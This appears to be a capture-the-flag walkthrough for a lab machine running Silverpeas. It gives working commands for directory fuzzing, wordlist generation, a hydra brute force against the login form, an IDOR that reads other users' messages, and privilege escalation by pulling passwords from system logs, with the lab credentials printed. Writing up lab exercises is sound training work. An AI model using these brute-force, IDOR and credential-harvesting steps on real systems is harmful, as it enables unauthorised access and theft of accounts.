Silver Platter — Silverpeas Login & IDOR (Detailed)
Phase 1: Finding the Username
Where: http://10.48.187.1 (port 80, main website)

What to do: Click the Contact tab on the homepage. You'll see text like:

"If you'd like to get in touch with us, please reach out to our project manager on Silverpeas. His username is scr1ptkiddy."

Why this matters:

Gives you a username to brute force
Tells you the CMS is Silverpeas → you now know what to search for on port 8080
Phase 2: Finding Silverpeas on Port 8080
Why port 8080? Your initial nmap scan showed:

8080/tcp  open  http-proxy  nginx

How to find the login page:

URL	Result
http://10.48.187.1:8080/	404 or redirect
http://10.48.187.1:8080/silverpeas/	Login page ✅

You could also fuzz for it:

ffuf -u http://10.48.187.1:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 404

Phase 3: Brute Forcing the Password
Why not just try common passwords? The room description says:

"their password policy requires passwords that have not been breached (they check it against the rockyou.txt wordlist)"

So rockyou.txt won't work. You need a custom wordlist from the website itself.

Step A — Generate wordlist:

cewl -m 3 -d 2 -A -w wordlist.txt http://10.48.187.1

Flag	Purpose
-m 3	Minimum word length = 3
-d 2	Crawl 2 levels deep (follows links)
-A	Extract words with numbers (e.g., scr1ptkiddy)

Step B — Brute force:

hydra -l scr1ptkiddy -P wordlist.txt 10.48.187.1 -s 8080 \
  http-post-form "/silverpeas/AuthenticationServlet:Login=^USER^&Password=^PASS^&DomainId=0:F=Login or password incorrect"

Part	Meaning
-l scr1ptkiddy	Single username (fixed)
-P wordlist.txt	Password list (one per line)
-s 8080	Target port
http-post-form	Custom POST-based login form
F=Login or password incorrect	Fail string — hydra checks the response for this text to know if a password was wrong

Result: password: adipiscing

Phase 4: IDOR — The Core Exploit
What is IDOR?

The server uses an ID number in the URL to fetch a specific message. It checks if you're logged in, but NOT if the message belongs to you. So any ID works.

How to find the vulnerable request:

After logging in, go to Notifications → Messages
Open DevTools (F12) → Network tab
Click on a message to read it
In the Network tab, find the request with:
Name: ReadMessage.jsp
Status: 200
The full URL will be:
http://10.48.187.1:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=5

How to exploit:

Method 1 — Browser (easiest):

Just type in your address bar:

http://10.48.187.1:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6

Your browser automatically sends your JSESSIONID cookie (proves you're logged in). The server returns message #6 — which belongs to tim.

Method 2 — curl (scriptable):

# First, get your current JSESSIONID from browser DevTools → Application → Cookies
# Then:
curl -sk -b "JSESSIONID=your_cookie_value_here" \
  "http://10.48.187.1:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6"

⚠️ Common mistake: Writing -b "cookie_value" instead of -b "JSESSIONID=cookie_value". The name is required.

Method 3 — Burp Repeater:

Intercept the ReadMessage.jsp?ID=5 request
Send to Repeater
Change ID=5 → ID=6
Send
⚠️ Make sure the Cookie: JSESSIONID=... header is present in the Repeater request. If it's missing, add it manually.

What you find in ID=6:

Dude how do you always forget the SSH password? Use a password manager...
Username: tim
Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol

Phase 5: SSH → User Flag
ssh tim@10.48.187.1
# password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol

tim@silver-platter:~$ cat user.txt

Phase 6: Privilege Escalation → Root
Step 1 — Check your groups:

id
# uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)

adm group = read access to /var/log/ files (auth.log, syslog, etc.)

Step 2 — Search logs for credentials:

grep -Ri 'password' /var/log 2>/dev/null
# or more targeted:
grep -i 'password' /var/log/auth.log

You'll find a line like:

sudo: tyler : TTY=pts/0 ; PWD=/home/tyler ; COMMAND=/usr/bin/docker run --name postgresql -d -e POSTGRES_PASSWORD=_Zd_zx7N823/ ...

Step 3 — Switch to tyler:

su tyler
# password: _Zd_zx7N823/

Step 4 — Sudo to root:

sudo -l
# User tyler may run the following commands on silver-platter:
#     (ALL : ALL) ALL

sudo su
cat /root/root.txt
